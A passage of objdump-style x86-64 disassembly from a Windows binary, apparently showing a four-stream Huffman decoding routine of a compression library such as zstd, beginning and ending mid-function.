   140003287:	89 45 a8             	mov    %eax,-0x58(%rbp)
   14000328a:	41 0f b6 44 76 04    	movzbl 0x4(%r14,%rsi,2),%eax
   140003290:	41 8b c9             	mov    %r9d,%ecx
   140003293:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140003298:	88 43 02             	mov    %al,0x2(%rbx)
   14000329b:	48 83 c3 03          	add    $0x3,%rbx
   14000329f:	48 d3 e7             	shl    %cl,%rdi
   1400032a2:	8b ca                	mov    %edx,%ecx
   1400032a4:	48 d3 ef             	shr    %cl,%rdi
   1400032a7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400032ac:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400032b1:	41 0f b6 44 7e 05    	movzbl 0x5(%r14,%rdi,2),%eax
   1400032b7:	41 03 c1             	add    %r9d,%eax
   1400032ba:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1400032bd:	41 0f b6 44 7e 04    	movzbl 0x4(%r14,%rdi,2),%eax
   1400032c3:	41 88 07             	mov    %al,(%r15)
   1400032c6:	49 ff c7             	inc    %r15
   1400032c9:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400032ce:	e8 bd df ff ff       	call   0x140001290
   1400032d3:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400032d8:	8b f0                	mov    %eax,%esi
   1400032da:	e8 b1 df ff ff       	call   0x140001290
   1400032df:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400032e3:	8b f8                	mov    %eax,%edi
   1400032e5:	e8 a6 df ff ff       	call   0x140001290
   1400032ea:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400032ee:	8b d8                	mov    %eax,%ebx
   1400032f0:	e8 9b df ff ff       	call   0x140001290
   1400032f5:	44 8b 8d 88 00 00 00 	mov    0x88(%rbp),%r9d
   1400032fc:	33 d2                	xor    %edx,%edx
   1400032fe:	85 c0                	test   %eax,%eax
   140003300:	0f 94 c2             	sete   %dl
   140003303:	33 c0                	xor    %eax,%eax
   140003305:	85 db                	test   %ebx,%ebx
   140003307:	0f 94 c0             	sete   %al
   14000330a:	33 c9                	xor    %ecx,%ecx
   14000330c:	23 d0                	and    %eax,%edx
   14000330e:	85 ff                	test   %edi,%edi
   140003310:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140003315:	0f 44 ca             	cmove  %edx,%ecx
   140003318:	33 c0                	xor    %eax,%eax
   14000331a:	85 f6                	test   %esi,%esi
   14000331c:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140003321:	0f 44 44 24 38       	cmove  0x38(%rsp),%eax
   140003326:	23 c8                	and    %eax,%ecx
   140003328:	33 c0                	xor    %eax,%eax
   14000332a:	4c 3b 7d c8          	cmp    -0x38(%rbp),%r15
   14000332e:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003332:	0f 42 c1             	cmovb  %ecx,%eax
   140003335:	85 c0                	test   %eax,%eax
   140003337:	0f 85 d3 fc ff ff    	jne    0x140003010
   14000333d:	8b 5c 24 3c          	mov    0x3c(%rsp),%ebx
   140003341:	4c 8b 65 d0          	mov    -0x30(%rbp),%r12
   140003345:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000334a:	4d 3b ec             	cmp    %r12,%r13
   14000334d:	77 0c                	ja     0x14000335b
   14000334f:	48 3b 74 24 40       	cmp    0x40(%rsp),%rsi
   140003354:	77 05                	ja     0x14000335b
   140003356:	48 3b f8             	cmp    %rax,%rdi
   140003359:	76 0c                	jbe    0x140003367
   14000335b:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140003362:	e9 a0 05 00 00       	jmp    0x140003907
   140003367:	49 8d 44 24 fd       	lea    -0x3(%r12),%rax
   14000336c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003371:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140003378:	e8 53 df ff ff       	call   0x1400012d0
   14000337d:	33 c9                	xor    %ecx,%ecx
   14000337f:	49 8d 54 24 fd       	lea    -0x3(%r12),%rdx
   140003384:	85 c0                	test   %eax,%eax
   140003386:	0f 94 c1             	sete   %cl
   140003389:	33 c0                	xor    %eax,%eax
   14000338b:	4c 3b ea             	cmp    %rdx,%r13
   14000338e:	0f 92 c0             	setb   %al
   140003391:	85 c8                	test   %ecx,%eax
   140003393:	0f 84 ea 00 00 00    	je     0x140003483
   140003399:	44 8b fb             	mov    %ebx,%r15d
   14000339c:	44 8b e3             	mov    %ebx,%r12d
   14000339f:	48 8b 9d 88 00 00 00 	mov    0x88(%rbp),%rbx
   1400033a6:	41 f7 df             	neg    %r15d
   1400033a9:	41 83 e7 3f          	and    $0x3f,%r15d
   1400033ad:	41 f7 dc             	neg    %r12d
   1400033b0:	41 83 e4 3f          	and    $0x3f,%r12d
   1400033b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400033b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400033bf:	00 
   1400033c0:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   1400033c5:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   1400033c9:	49 8b d2             	mov    %r10,%rdx
   1400033cc:	48 d3 e2             	shl    %cl,%rdx
   1400033cf:	41 8b cf             	mov    %r15d,%ecx
   1400033d2:	48 d3 ea             	shr    %cl,%rdx
   1400033d5:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400033db:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   1400033e1:	49 8b d2             	mov    %r10,%rdx
   1400033e4:	44 03 4c 24 58       	add    0x58(%rsp),%r9d
   1400033e9:	41 88 45 00          	mov    %al,0x0(%r13)
   1400033ed:	41 8b c9             	mov    %r9d,%ecx
   1400033f0:	48 d3 e2             	shl    %cl,%rdx
   1400033f3:	41 8b cc             	mov    %r12d,%ecx
   1400033f6:	48 d3 ea             	shr    %cl,%rdx
   1400033f9:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400033ff:	45 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%r8d
   140003405:	49 8b d2             	mov    %r10,%rdx
   140003408:	41 88 45 01          	mov    %al,0x1(%r13)
   14000340c:	45 03 c1             	add    %r9d,%r8d
   14000340f:	41 8b c8             	mov    %r8d,%ecx
   140003412:	48 d3 e2             	shl    %cl,%rdx
   140003415:	41 8b cc             	mov    %r12d,%ecx
   140003418:	48 d3 ea             	shr    %cl,%rdx
   14000341b:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   140003421:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003427:	45 03 c8             	add    %r8d,%r9d
   14000342a:	41 88 45 02          	mov    %al,0x2(%r13)
   14000342e:	41 8b c9             	mov    %r9d,%ecx
   140003431:	49 d3 e2             	shl    %cl,%r10
   140003434:	41 8b cc             	mov    %r12d,%ecx
   140003437:	49 d3 ea             	shr    %cl,%r10
   14000343a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000343f:	43 0f b6 44 56 05    	movzbl 0x5(%r14,%r10,2),%eax
   140003445:	41 03 c1             	add    %r9d,%eax
   140003448:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000344c:	43 0f b6 44 56 04    	movzbl 0x4(%r14,%r10,2),%eax
   140003452:	41 88 45 03          	mov    %al,0x3(%r13)
   140003456:	49 83 c5 04          	add    $0x4,%r13
   14000345a:	e8 71 de ff ff       	call   0x1400012d0
   14000345f:	33 c9                	xor    %ecx,%ecx
   140003461:	85 c0                	test   %eax,%eax
   140003463:	0f 94 c1             	sete   %cl
   140003466:	33 c0                	xor    %eax,%eax
   140003468:	4c 3b eb             	cmp    %rbx,%r13
   14000346b:	0f 92 c0             	setb   %al
   14000346e:	85 c8                	test   %ecx,%eax
   140003470:	0f 85 4a ff ff ff    	jne    0x1400033c0
   140003476:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000347b:	8b 5c 24 3c          	mov    0x3c(%rsp),%ebx
   14000347f:	4c 8b 65 d0          	mov    -0x30(%rbp),%r12
   140003483:	4d 3b ec             	cmp    %r12,%r13
   140003486:	73 47                	jae    0x1400034cf
   140003488:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   14000348d:	44 8b cb             	mov    %ebx,%r9d
   140003490:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140003495:	41 f7 d9             	neg    %r9d
   140003498:	41 83 e1 3f          	and    $0x3f,%r9d
   14000349c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400034a0:	41 8b c8             	mov    %r8d,%ecx
   1400034a3:	49 8b d2             	mov    %r10,%rdx
   1400034a6:	48 d3 e2             	shl    %cl,%rdx
   1400034a9:	41 8b c9             	mov    %r9d,%ecx
   1400034ac:	48 d3 ea             	shr    %cl,%rdx
   1400034af:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   1400034b5:	44 03 c0             	add    %eax,%r8d
   1400034b8:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400034be:	41 88 45 00          	mov    %al,0x0(%r13)
   1400034c2:	49 ff c5             	inc    %r13
   1400034c5:	4d 3b ec             	cmp    %r12,%r13
   1400034c8:	72 d6                	jb     0x1400034a0
   1400034ca:	44 89 44 24 58       	mov    %r8d,0x58(%rsp)
   1400034cf:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   1400034d4:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400034d9:	4d 8d 65 fd          	lea    -0x3(%r13),%r12
   1400034dd:	4c 89 a5 88 00 00 00 	mov    %r12,0x88(%rbp)
   1400034e4:	e8 e7 dd ff ff       	call   0x1400012d0
   1400034e9:	33 c9                	xor    %ecx,%ecx
   1400034eb:	85 c0                	test   %eax,%eax
   1400034ed:	0f 94 c1             	sete   %cl
   1400034f0:	33 c0                	xor    %eax,%eax
   1400034f2:	49 3b f4             	cmp    %r12,%rsi
   1400034f5:	0f 92 c0             	setb   %al
   1400034f8:	85 c8                	test   %ecx,%eax
   1400034fa:	0f 84 d8 00 00 00    	je     0x1400035d8
   140003500:	4c 8b ad 88 00 00 00 	mov    0x88(%rbp),%r13
   140003507:	44 8b fb             	mov    %ebx,%r15d
   14000350a:	41 f7 df             	neg    %r15d
   14000350d:	44 8b e3             	mov    %ebx,%r12d
   140003510:	41 83 e7 3f          	and    $0x3f,%r15d
   140003514:	41 f7 dc             	neg    %r12d
   140003517:	41 83 e4 3f          	and    $0x3f,%r12d
   14000351b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003520:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
   140003525:	8b 4d 80             	mov    -0x80(%rbp),%ecx
   140003528:	49 8b d2             	mov    %r10,%rdx
   14000352b:	48 d3 e2             	shl    %cl,%rdx
   14000352e:	41 8b cf             	mov    %r15d,%ecx
   140003531:	48 d3 ea             	shr    %cl,%rdx
   140003534:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   14000353a:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   140003540:	49 8b d2             	mov    %r10,%rdx
   140003543:	44 03 4d 80          	add    -0x80(%rbp),%r9d
   140003547:	88 06                	mov    %al,(%rsi)
   140003549:	41 8b c9             	mov    %r9d,%ecx
   14000354c:	48 d3 e2             	shl    %cl,%rdx
   14000354f:	41 8b cc             	mov    %r12d,%ecx
   140003552:	48 d3 ea             	shr    %cl,%rdx
   140003555:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   14000355b:	45 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%r8d
   140003561:	49 8b d2             	mov    %r10,%rdx
   140003564:	88 46 01             	mov    %al,0x1(%rsi)
   140003567:	45 03 c1             	add    %r9d,%r8d
   14000356a:	41 8b c8             	mov    %r8d,%ecx
   14000356d:	48 d3 e2             	shl    %cl,%rdx
   140003570:	41 8b cc             	mov    %r12d,%ecx
   140003573:	48 d3 ea             	shr    %cl,%rdx
   140003576:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   14000357c:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003582:	45 03 c8             	add    %r8d,%r9d
   140003585:	88 46 02             	mov    %al,0x2(%rsi)
   140003588:	41 8b c9             	mov    %r9d,%ecx
   14000358b:	49 d3 e2             	shl    %cl,%r10
   14000358e:	41 8b cc             	mov    %r12d,%ecx
   140003591:	49 d3 ea             	shr    %cl,%r10
   140003594:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140003599:	43 0f b6 44 56 05    	movzbl 0x5(%r14,%r10,2),%eax
   14000359f:	41 03 c1             	add    %r9d,%eax
   1400035a2:	89 45 80             	mov    %eax,-0x80(%rbp)
   1400035a5:	43 0f b6 44 56 04    	movzbl 0x4(%r14,%r10,2),%eax
   1400035ab:	88 46 03             	mov    %al,0x3(%rsi)
   1400035ae:	48 83 c6 04          	add    $0x4,%rsi
   1400035b2:	e8 19 dd ff ff       	call   0x1400012d0
   1400035b7:	33 c9                	xor    %ecx,%ecx
   1400035b9:	85 c0                	test   %eax,%eax
   1400035bb:	0f 94 c1             	sete   %cl
   1400035be:	33 c0                	xor    %eax,%eax
   1400035c0:	49 3b f5             	cmp    %r13,%rsi
   1400035c3:	0f 92 c0             	setb   %al
   1400035c6:	85 c8                	test   %ecx,%eax
   1400035c8:	0f 85 52 ff ff ff    	jne    0x140003520
   1400035ce:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   1400035d3:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   1400035d8:	49 3b f5             	cmp    %r13,%rsi
   1400035db:	73 3f                	jae    0x14000361c
   1400035dd:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
   1400035e2:	44 8b cb             	mov    %ebx,%r9d
   1400035e5:	44 8b 45 80          	mov    -0x80(%rbp),%r8d
   1400035e9:	41 f7 d9             	neg    %r9d
   1400035ec:	41 83 e1 3f          	and    $0x3f,%r9d
   1400035f0:	41 8b c8             	mov    %r8d,%ecx
   1400035f3:	49 8b d2             	mov    %r10,%rdx
   1400035f6:	48 d3 e2             	shl    %cl,%rdx
   1400035f9:	41 8b c9             	mov    %r9d,%ecx
   1400035fc:	48 d3 ea             	shr    %cl,%rdx
   1400035ff:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   140003605:	44 03 c0             	add    %eax,%r8d
   140003608:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   14000360e:	88 06                	mov    %al,(%rsi)
   140003610:	48 ff c6             	inc    %rsi
   140003613:	49 3b f5             	cmp    %r13,%rsi
   140003616:	72 d8                	jb     0x1400035f0
   140003618:	44 89 45 80          	mov    %r8d,-0x80(%rbp)
   14000361c:	4c 8b 6c 24 48       	mov    0x48(%rsp),%r13
   140003621:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140003625:	49 8d 75 fd          	lea    -0x3(%r13),%rsi
   140003629:	e8 a2 dc ff ff       	call   0x1400012d0
   14000362e:	33 c9                	xor    %ecx,%ecx
   140003630:	85 c0                	test   %eax,%eax
   140003632:	0f 94 c1             	sete   %cl
   140003635:	33 c0                	xor    %eax,%eax
   140003637:	48 3b fe             	cmp    %rsi,%rdi
   14000363a:	0f 92 c0             	setb   %al
   14000363d:	85 c8                	test   %ecx,%eax
   14000363f:	0f 84 c9 00 00 00    	je     0x14000370e
   140003645:	44 8b e3             	mov    %ebx,%r12d
   140003648:	4d 8d 7d fd          	lea    -0x3(%r13),%r15
   14000364c:	41 f7 dc             	neg    %r12d
   14000364f:	8b f3                	mov    %ebx,%esi
   140003651:	41 83 e4 3f          	and    $0x3f,%r12d
   140003655:	f7 de                	neg    %esi
   140003657:	83 e6 3f             	and    $0x3f,%esi
   14000365a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003660:	4c 8b 55 a0          	mov    -0x60(%rbp),%r10
   140003664:	8b 4d a8             	mov    -0x58(%rbp),%ecx
   140003667:	49 8b d2             	mov    %r10,%rdx
   14000366a:	48 d3 e2             	shl    %cl,%rdx
   14000366d:	41 8b cc             	mov    %r12d,%ecx
   140003670:	48 d3 ea             	shr    %cl,%rdx
   140003673:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003679:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   14000367f:	49 8b d2             	mov    %r10,%rdx
   140003682:	44 03 4d a8          	add    -0x58(%rbp),%r9d
   140003686:	88 07                	mov    %al,(%rdi)
   140003688:	41 8b c9             	mov    %r9d,%ecx
   14000368b:	48 d3 e2             	shl    %cl,%rdx
   14000368e:	8b ce                	mov    %esi,%ecx
   140003690:	48 d3 ea             	shr    %cl,%rdx
   140003693:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003699:	45 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%r8d
   14000369f:	49 8b d2             	mov    %r10,%rdx
   1400036a2:	88 47 01             	mov    %al,0x1(%rdi)
   1400036a5:	45 03 c1             	add    %r9d,%r8d
   1400036a8:	41 8b c8             	mov    %r8d,%ecx
   1400036ab:	48 d3 e2             	shl    %cl,%rdx
   1400036ae:	8b ce                	mov    %esi,%ecx
   1400036b0:	48 d3 ea             	shr    %cl,%rdx
   1400036b3:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   1400036b9:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400036bf:	45 03 c8             	add    %r8d,%r9d
   1400036c2:	88 47 02             	mov    %al,0x2(%rdi)
   1400036c5:	41 8b c9             	mov    %r9d,%ecx
   1400036c8:	49 d3 e2             	shl    %cl,%r10
   1400036cb:	8b ce                	mov    %esi,%ecx
   1400036cd:	49 d3 ea             	shr    %cl,%r10
   1400036d0:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400036d4:	43 0f b6 44 56 05    	movzbl 0x5(%r14,%r10,2),%eax
   1400036da:	41 03 c1             	add    %r9d,%eax
   1400036dd:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400036e0:	43 0f b6 44 56 04    	movzbl 0x4(%r14,%r10,2),%eax
   1400036e6:	88 47 03             	mov    %al,0x3(%rdi)
   1400036e9:	48 83 c7 04          	add    $0x4,%rdi
   1400036ed:	e8 de db ff ff       	call   0x1400012d0
   1400036f2:	33 c9                	xor    %ecx,%ecx
   1400036f4:	85 c0                	test   %eax,%eax
   1400036f6:	0f 94 c1             	sete   %cl
   1400036f9:	33 c0                	xor    %eax,%eax
   1400036fb:	49 3b ff             	cmp    %r15,%rdi
   1400036fe:	0f 92 c0             	setb   %al
   140003701:	85 c8                	test   %ecx,%eax
   140003703:	0f 85 57 ff ff ff    	jne    0x140003660
   140003709:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000370e:	49 3b fd             	cmp    %r13,%rdi
   140003711:	73 49                	jae    0x14000375c
   140003713:	4c 8b 55 a0          	mov    -0x60(%rbp),%r10
   140003717:	44 8b cb             	mov    %ebx,%r9d
   14000371a:	44 8b 45 a8          	mov    -0x58(%rbp),%r8d
   14000371e:	41 f7 d9             	neg    %r9d
   140003721:	41 83 e1 3f          	and    $0x3f,%r9d
   140003725:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000372c:	00 00 00 00 
   140003730:	41 8b c8             	mov    %r8d,%ecx
   140003733:	49 8b d2             	mov    %r10,%rdx
   140003736:	48 d3 e2             	shl    %cl,%rdx
   140003739:	41 8b c9             	mov    %r9d,%ecx
   14000373c:	48 d3 ea             	shr    %cl,%rdx
   14000373f:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   140003745:	44 03 c0             	add    %eax,%r8d
   140003748:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   14000374e:	88 07                	mov    %al,(%rdi)
   140003750:	48 ff c7             	inc    %rdi
   140003753:	49 3b fd             	cmp    %r13,%rdi
   140003756:	72 d8                	jb     0x140003730
   140003758:	44 89 45 a8          	mov    %r8d,-0x58(%rbp)
   14000375c:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003760:	e8 6b db ff ff       	call   0x1400012d0
   140003765:	4c 8b 6d 20          	mov    0x20(%rbp),%r13
   140003769:	33 d2                	xor    %edx,%edx
   14000376b:	85 c0                	test   %eax,%eax
   14000376d:	0f 94 c2             	sete   %dl
   140003770:	33 c9                	xor    %ecx,%ecx
   140003772:	49 8d 45 fd          	lea    -0x3(%r13),%rax
   140003776:	4c 3b f8             	cmp    %rax,%r15
   140003779:	0f 92 c1             	setb   %cl
   14000377c:	85 d1                	test   %edx,%ecx
   14000377e:	0f 84 c8 00 00 00    	je     0x14000384c
   140003784:	8b f3                	mov    %ebx,%esi
   140003786:	4d 8d 65 fd          	lea    -0x3(%r13),%r12
   14000378a:	f7 de                	neg    %esi
   14000378c:	8b fb                	mov    %ebx,%edi
   14000378e:	83 e6 3f             	and    $0x3f,%esi
   140003791:	f7 df                	neg    %edi
   140003793:	83 e7 3f             	and    $0x3f,%edi
   140003796:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000379d:	00 00 00 
   1400037a0:	4c 8b 55 d8          	mov    -0x28(%rbp),%r10
   1400037a4:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   1400037a7:	49 8b d2             	mov    %r10,%rdx
   1400037aa:	48 d3 e2             	shl    %cl,%rdx
   1400037ad:	8b ce                	mov    %esi,%ecx
   1400037af:	48 d3 ea             	shr    %cl,%rdx
   1400037b2:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400037b8:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   1400037be:	49 8b d2             	mov    %r10,%rdx
   1400037c1:	44 03 4d e0          	add    -0x20(%rbp),%r9d
   1400037c5:	41 88 07             	mov    %al,(%r15)
   1400037c8:	41 8b c9             	mov    %r9d,%ecx
   1400037cb:	48 d3 e2             	shl    %cl,%rdx
   1400037ce:	8b cf                	mov    %edi,%ecx
   1400037d0:	48 d3 ea             	shr    %cl,%rdx
   1400037d3:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   1400037d9:	45 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%r8d
   1400037df:	49 8b d2             	mov    %r10,%rdx
   1400037e2:	41 88 47 01          	mov    %al,0x1(%r15)
   1400037e6:	45 03 c1             	add    %r9d,%r8d
   1400037e9:	41 8b c8             	mov    %r8d,%ecx
   1400037ec:	48 d3 e2             	shl    %cl,%rdx
   1400037ef:	8b cf                	mov    %edi,%ecx
   1400037f1:	48 d3 ea             	shr    %cl,%rdx
   1400037f4:	45 0f b6 4c 56 05    	movzbl 0x5(%r14,%rdx,2),%r9d
   1400037fa:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   140003800:	45 03 c8             	add    %r8d,%r9d
   140003803:	41 88 47 02          	mov    %al,0x2(%r15)
   140003807:	41 8b c9             	mov    %r9d,%ecx
   14000380a:	49 d3 e2             	shl    %cl,%r10
   14000380d:	8b cf                	mov    %edi,%ecx
   14000380f:	49 d3 ea             	shr    %cl,%r10
   140003812:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003816:	43 0f b6 44 56 05    	movzbl 0x5(%r14,%r10,2),%eax
   14000381c:	41 03 c1             	add    %r9d,%eax
   14000381f:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140003822:	43 0f b6 44 56 04    	movzbl 0x4(%r14,%r10,2),%eax
   140003828:	41 88 47 03          	mov    %al,0x3(%r15)
   14000382c:	49 83 c7 04          	add    $0x4,%r15
   140003830:	e8 9b da ff ff       	call   0x1400012d0
   140003835:	33 c9                	xor    %ecx,%ecx
   140003837:	85 c0                	test   %eax,%eax
   140003839:	0f 94 c1             	sete   %cl
   14000383c:	33 c0                	xor    %eax,%eax
   14000383e:	4d 3b fc             	cmp    %r12,%r15
   140003841:	0f 92 c0             	setb   %al
   140003844:	85 c8                	test   %ecx,%eax
   140003846:	0f 85 54 ff ff ff    	jne    0x1400037a0
   14000384c:	44 8b 45 e0          	mov    -0x20(%rbp),%r8d
   140003850:	4d 3b fd             	cmp    %r13,%r15
   140003853:	73 33                	jae    0x140003888
   140003855:	4c 8b 4d d8          	mov    -0x28(%rbp),%r9
   140003859:	f7 db                	neg    %ebx
   14000385b:	83 e3 3f             	and    $0x3f,%ebx
   14000385e:	66 90                	xchg   %ax,%ax
   140003860:	41 8b c8             	mov    %r8d,%ecx
   140003863:	49 8b d1             	mov    %r9,%rdx
   140003866:	48 d3 e2             	shl    %cl,%rdx
   140003869:	8b cb                	mov    %ebx,%ecx
   14000386b:	48 d3 ea             	shr    %cl,%rdx
   14000386e:	41 0f b6 44 56 05    	movzbl 0x5(%r14,%rdx,2),%eax
   140003874:	44 03 c0             	add    %eax,%r8d
   140003877:	41 0f b6 44 56 04    	movzbl 0x4(%r14,%rdx,2),%eax
   14000387d:	41 88 07             	mov    %al,(%r15)
   140003880:	49 ff c7             	inc    %r15
   140003883:	4d 3b fd             	cmp    %r13,%r15
   140003886:	72 d8                	jb     0x140003860
   140003888:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   14000388d:	48 39 44 24 60       	cmp    %rax,0x60(%rsp)
   140003892:	75 11                	jne    0x1400038a5
   140003894:	83 7c 24 58 40       	cmpl   $0x40,0x58(%rsp)
   140003899:	75 0a                	jne    0x1400038a5
   14000389b:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400038a0:	44 8b d1             	mov    %ecx,%r10d
   1400038a3:	eb 08                	jmp    0x1400038ad
   1400038a5:	45 33 d2             	xor    %r10d,%r10d
   1400038a8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400038ad:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400038b1:	48 39 45 88          	cmp    %rax,-0x78(%rbp)
   1400038b5:	75 0b                	jne    0x1400038c2
   1400038b7:	83 7d 80 40          	cmpl   $0x40,-0x80(%rbp)
   1400038bb:	75 05                	jne    0x1400038c2
   1400038bd:	44 8b c9             	mov    %ecx,%r9d
   1400038c0:	eb 03                	jmp    0x1400038c5
   1400038c2:	45 33 c9             	xor    %r9d,%r9d
   1400038c5:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   1400038c9:	48 39 45 b0          	cmp    %rax,-0x50(%rbp)
   1400038cd:	75 0a                	jne    0x1400038d9
   1400038cf:	83 7d a8 40          	cmpl   $0x40,-0x58(%rbp)
   1400038d3:	75 04                	jne    0x1400038d9
   1400038d5:	8b d1                	mov    %ecx,%edx
   1400038d7:	eb 02                	jmp    0x1400038db
   1400038d9:	33 d2                	xor    %edx,%edx
   1400038db:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400038df:	48 39 45 e8          	cmp    %rax,-0x18(%rbp)
   1400038e3:	75 06                	jne    0x1400038eb
   1400038e5:	41 83 f8 40          	cmp    $0x40,%r8d
   1400038e9:	74 02                	je     0x1400038ed
   1400038eb:	33 c9                	xor    %ecx,%ecx
   1400038ed:	23 ca                	and    %edx,%ecx
   1400038ef:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400038f6:	41 23 c9             	and    %r9d,%ecx
   1400038f9:	41 85 ca             	test   %ecx,%r10d
   1400038fc:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140003900:	48 0f 44 c8          	cmove  %rax,%rcx
   140003904:	48 8b c1             	mov    %rcx,%rax
   140003907:	4c 8b b4 24 38 01 00 	mov    0x138(%rsp),%r14
   14000390e:	00 
   14000390f:	4c 8b a4 24 70 01 00 	mov    0x170(%rsp),%r12
   140003916:	00 
   140003917:	4c 8b bc 24 30 01 00 	mov    0x130(%rsp),%r15
   14000391e:	00 
   14000391f:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140003926:	41 5d                	pop    %r13
   140003928:	5f                   	pop    %rdi
   140003929:	5e                   	pop    %rsi
   14000392a:	5b                   	pop    %rbx
   14000392b:	5d                   	pop    %rbp
   14000392c:	c3                   	ret
   14000392d:	cc                   	int3
   14000392e:	cc                   	int3
   14000392f:	cc                   	int3
   140003930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003935:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000393a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000393f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003944:	41 56                	push   %r14
   140003946:	48 83 ec 30          	sub    $0x30,%rsp
   14000394a:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000394f:	49 8b f9             	mov    %r9,%rdi
   140003952:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140003957:	49 8b e8             	mov    %r8,%rbp
   14000395a:	4c 8b f2             	mov    %rdx,%r14
   14000395d:	4c 8b c3             	mov    %rbx,%r8
   140003960:	48 8b d7             	mov    %rdi,%rdx
   140003963:	48 8b f1             	mov    %rcx,%rsi
   140003966:	e8 05 ee ff ff       	call   0x140002770
   14000396b:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   14000396f:	77 30                	ja     0x1400039a1
   140003971:	48 3b c3             	cmp    %rbx,%rax
   140003974:	72 09                	jb     0x14000397f
